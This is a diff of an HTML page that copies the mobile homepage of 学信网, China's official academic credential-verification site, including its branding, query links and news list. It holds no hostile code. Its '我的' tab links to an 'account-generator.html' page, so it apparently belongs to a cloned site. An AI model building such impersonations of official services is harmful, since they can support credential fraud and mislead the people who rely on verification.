@@ -4,19 +4,478 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>学信网 - 首页</title>
-    <script>
-        // 自动跳转到学信档案首页（如有登录）或登录页
-        (function() {
-            var uid = localStorage.getItem('xuexin_user_id');
-            if (uid) {
-                window.location.replace('archive.html');
-            } else {
-                window.location.replace('login.html');
-            }
-        })();
-    </script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body {
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", "Microsoft YaHei", sans-serif;
+            background: #f5f5f5;
+        }
+
+        /* ===== 页面容器 ===== */
+        .page-container {
+            min-height: 100%;
+            padding-bottom: 60px;
+        }
+
+        /* ===== 顶部绿色栏 ===== */
+        .top-header {
+            background: #00a05b;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 15px;
+            position: relative;
+        }
+        .header-center {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .header-logo {
+            width: 24px;
+            height: 24px;
+        }
+        .header-title {
+            font-size: 18px;
+            font-weight: 500;
+            color: white;
+        }
+        .header-menu {
+            position: absolute;
+            right: 15px;
+            width: 22px;
+            height: 22px;
+            cursor: pointer;
+        }
+
+        /* ===== 内容区 ===== */
+        .content {
+            padding: 12px;
+        }
+
+        /* ===== 搜索栏 ===== */
+        .search-bar {
+            background: white;
+            border-radius: 8px;
+            padding: 12px 14px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .search-bar input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 14px;
+            color: #333;
+            background: #f5f5f5;
+            padding: 8px 12px;
+            border-radius: 20px;
+        }
+        .search-bar input::placeholder { color: #bbb; }
+        .search-btn {
+            background: #00a05b;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        /* ===== 轮播图 ===== */
+        .banner {
+            background: linear-gradient(135deg, #00a05b 0%, #00c853 100%);
+            border-radius: 8px;
+            padding: 20px 16px;
+            margin-bottom: 12px;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+        .banner-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .banner-desc {
+            font-size: 13px;
+            opacity: 0.9;
+            line-height: 1.5;
+        }
+        .banner-dots {
+            display: flex;
+            gap: 6px;
+            margin-top: 12px;
+        }
+        .banner-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.5);
+        }
+        .banner-dot.active { background: white; }
+
+        /* ===== 功能入口 ===== */
+        .quick-entry {
+            background: white;
+            border-radius: 8px;
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            padding: 16px 8px;
+            margin-bottom: 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .quick-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 8px 4px;
+            text-decoration: none;
+        }
+        .quick-item:active { opacity: 0.7; }
+        .quick-icon {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .quick-icon svg { width: 100%; height: 100%; }
+        .quick-label {
+            font-size: 12px;
+            color: #333;
+            text-align: center;
+        }
+
+        /* ===== 资讯列表 ===== */
+        .news-section {
+            background: white;
+            border-radius: 8px;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .news-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 12px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .news-item {
+            display: flex;
+            align-items: center;
+            padding: 8px 0;
+            text-decoration: none;
+            color: #333;
+            border-bottom: 1px solid #f8f8f8;
+        }
+        .news-item:last-child { border-bottom: none; }
+        .news-tag {
+            font-size: 11px;
+            color: #00a05b;
+            border: 1px solid #00a05b;
+            padding: 1px 6px;
+            border-radius: 3px;
+            margin-right: 10px;
+            white-space: nowrap;
+        }
+        .news-text {
+            font-size: 14px;
+            flex: 1;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .news-date {
+            font-size: 12px;
+            color: #999;
+            margin-left: 10px;
+            white-space: nowrap;
+        }
+
+        /* ===== 底部导航栏 ===== */
+        .bottom-tab {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 56px;
+            background: white;
+            border-top: 1px solid #e8e8e8;
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            z-index: 1000;
+        }
+        .tab-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 3px;
+            text-decoration: none;
+            padding: 4px 0;
+            flex: 1;
+        }
+        .tab-item .tab-icon {
+            width: 24px;
+            height: 24px;
+        }
+        .tab-item .tab-icon svg {
+            width: 100%;
+            height: 100%;
+        }
+        .tab-item .tab-label {
+            font-size: 10px;
+            color: #666;
+        }
+        .tab-item.active .tab-label {
+            color: #00a05b;
+        }
+
+        /* ===== 菜单弹窗 ===== */
+        .menu-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 10000;
+            display: none;
+        }
+        .menu-overlay.open { display: block; }
+        .menu-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            z-index: 10001;
+            display: none;
+            padding: 0 0 20px;
+            border-radius: 0 0 12px 12px;
+        }
+        .menu-popup.open { display: block; }
+        .menu-popup .close-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 16px;
+        }
+        .menu-popup .close-bar span { font-weight: bold; font-size: 16px; }
+        .menu-popup .close-bar .close-btn { font-size: 22px; color: #999; cursor: pointer; }
+        .menu-popup .menu-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            padding: 0 12px;
+            gap: 8px;
+        }
+        .menu-popup .menu-grid a {
+            display: block;
+            text-align: center;
+            padding: 10px 6px;
+            font-size: 14px;
+            color: #333;
+            text-decoration: none;
+            background: #f5f5f5;
+            border-radius: 8px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+    </style>
 </head>
 <body>
-    <p style="text-align:center;margin-top:40vh;color:#999;font-family:sans-serif;">跳转中...</p>
+
+<!-- 菜单遮罩 -->
+<div class="menu-overlay" id="menuOverlay" onclick="closeMenu()"></div>
+<div class="menu-popup" id="menuPanel">
+    <div class="close-bar">
+        <span>学信网</span>
+        <span class="close-btn" onclick="closeMenu()">&times;</span>
+    </div>
+    <div class="menu-grid">
+        <a href="index.html">首页</a>
+        <a href="xueji.html">学籍查询</a>
+        <a href="xueli.html">学历查询</a>
+        <a href="xuewei.html">学位查询</a>
+        <a href="online-verify.html">在线验证</a>
+        <a href="abroad.html">出国教育背景</a>
+        <a href="photo-check.html">图像校对</a>
+        <a href="archive.html">学信档案</a>
+        <a href="gaokao.html">高考</a>
+        <a href="yanzhao.html">研招</a>
+        <a href="gat.html">港澳台招生</a>
+        <a href="zhengbing.html">征兵</a>
+        <a href="jiuye.html">就业</a>
+        <a href="xuezhi.html">学职平台</a>
+    </div>
+</div>
+
+<div class="page-container">
+    <!-- 顶部绿色栏 -->
+    <div class="top-header">
+        <div class="header-center">
+            <img class="header-logo" src="xxw.png" alt="">
+            <span class="header-title">学信网</span>
+        </div>
+        <svg class="header-menu" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" onclick="openMenu()">
+            <line x1="3" y1="6" x2="21" y2="6"/>
+            <line x1="3" y1="12" x2="21" y2="12"/>
+            <line x1="3" y1="18" x2="21" y2="18"/>
+        </svg>
+    </div>
+
+    <!-- 内容区 -->
+    <div class="content">
+        <!-- 搜索栏 -->
+        <div class="search-bar">
+            <input type="text" placeholder="搜索学籍、学历、证书...">
+            <button class="search-btn">搜索</button>
+        </div>
+
+        <!-- 轮播图 -->
+        <div class="banner">
+            <div class="banner-title">教育部学历查询网站</div>
+            <div class="banner-desc">提供学籍、学历、学位查询，在线验证报告，学历认证等服务</div>
+            <div class="banner-dots">
+                <span class="banner-dot active"></span>
+                <span class="banner-dot"></span>
+                <span class="banner-dot"></span>
+            </div>
+        </div>
+
+        <!-- 快速入口 -->
+        <div class="quick-entry">
+            <a href="xueji.html" class="quick-item">
+                <div class="quick-icon">
+                    <svg viewBox="0 0 48 48" fill="none">
+                        <rect x="8" y="20" width="32" height="24" rx="2" fill="#4caf50"/>
+                        <path d="M24 8 L40 18 L40 22 L24 12 L8 22 L8 18 Z" fill="#4caf50"/>
+                        <circle cx="24" cy="30" r="6" fill="white"/>
+                        <path d="M20 30 L24 34 L30 26" stroke="#4caf50" stroke-width="2" fill="none"/>
+                    </svg>
+                </div>
+                <span class="quick-label">学籍查询</span>
+            </a>
+            <a href="xueli.html" class="quick-item">
+                <div class="quick-icon">
+                    <svg viewBox="0 0 48 48" fill="none">
+                        <rect x="8" y="10" width="32" height="28" rx="2" fill="#42a5f5"/>
+                        <rect x="12" y="16" width="20" height="3" fill="white"/>
+                        <rect x="12" y="22" width="16" height="3" fill="white"/>
+                        <rect x="12" y="28" width="24" height="3" fill="white"/>
+                    </svg>
+                </div>
+                <span class="quick-label">学历查询</span>
+            </a>
+            <a href="xuewei.html" class="quick-item">
+                <div class="quick-icon">
+                    <svg viewBox="0 0 48 48" fill="none">
+                        <circle cx="24" cy="16" r="10" fill="#ffa726"/>
+                        <rect x="14" y="26" width="20" height="16" rx="2" fill="#ffa726"/>
+                        <rect x="18" y="30" width="12" height="8" rx="1" fill="white"/>
+                        <line x1="24" y1="26" x2="24" y2="22" stroke="#ffa726" stroke-width="3"/>
+                    </svg>
+                </div>
+                <span class="quick-label">学位查询</span>
+            </a>
+            <a href="online-verify.html" class="quick-item">
+                <div class="quick-icon">
+                    <svg viewBox="0 0 48 48" fill="none">
+                        <rect x="8" y="8" width="32" height="32" rx="4" fill="#4caf50"/>
+                        <path d="M16 24 L22 30 L34 18" stroke="white" stroke-width="4" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <span class="quick-label">在线验证</span>
+            </a>
+        </div>
+
+        <!-- 最新资讯 -->
+        <div class="news-section">
+            <div class="news-title">最新资讯</div>
+            <a href="#" class="news-item">
+                <span class="news-tag">通知</span>
+                <span class="news-text">教育部关于做好2025年普通高校招生工作的通知</span>
+                <span class="news-date">07-01</span>
+            </a>
+            <a href="#" class="news-item">
+                <span class="news-tag">公告</span>
+                <span class="news-text">2025年上半年全国大学英语四六级考试成绩查询</span>
+                <span class="news-date">06-28</span>
+            </a>
+            <a href="#" class="news-item">
+                <span class="news-tag">政策</span>
+                <span class="news-text">关于做好学历学位认证服务工作的通知</span>
+                <span class="news-date">06-25</span>
+            </a>
+            <a href="#" class="news-item">
+                <span class="news-tag">通知</span>
+                <span class="news-text">2025年研究生招生考试报名即将开始</span>
+                <span class="news-date">06-20</span>
+            </a>
+        </div>
+    </div>
+</div>
+
+<!-- 底部导航栏 -->
+<div class="bottom-tab">
+    <a href="index.html" class="tab-item active">
+        <div class="tab-icon">
+            <svg viewBox="0 0 24 24" fill="#00a05b">
+                <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/>
+            </svg>
+        </div>
+        <span class="tab-label">首页</span>
+    </a>
+    <a href="xueji.html" class="tab-item">
+        <div class="tab-icon">
+            <svg viewBox="0 0 24 24" fill="#666">
+                <path d="M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82zM12 3L1 9l11 6 9-4.91V17h2V9L12 3z"/>
+            </svg>
+        </div>
+        <span class="tab-label">学籍学历学位</span>
+    </a>
+    <a href="#" class="tab-item">
+        <div class="tab-icon">
+            <svg viewBox="0 0 24 24" fill="#666">
+                <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/>
+            </svg>
+        </div>
+        <span class="tab-label">个人测评</span>
+    </a>
+    <a href="jiuye.html" class="tab-item">
+        <div class="tab-icon">
+            <svg viewBox="0 0 24 24" fill="#666">
+                <path d="M20 6h-4V4c0-1.11-.89-2-2-2h-4c-1.11 0-2 .89-2 2v2H4c-1.11 0-1.99.89-1.99 2L2 19c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2zm-6 0h-4V4h4v2z"/>
+            </svg>
+        </div>
+        <span class="tab-label">求职招聘</span>
+    </a>
+    <a href="account-generator.html" class="tab-item">
+        <div class="tab-icon">
+            <svg viewBox="0 0 24 24" fill="#666">
+                <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+            </svg>
+        </div>
+        <span class="tab-label">我的</span>
+    </a>
+</div>
+
+<script>
+function openMenu() {
+    document.getElementById('menuOverlay').classList.add('open');
+    document.getElementById('menuPanel').classList.add('open');
+}
+function closeMenu() {
+    document.getElementById('menuOverlay').classList.remove('open');
+    document.getElementById('menuPanel').classList.remove('open');
+}
+</script>
 </body>
 </html>
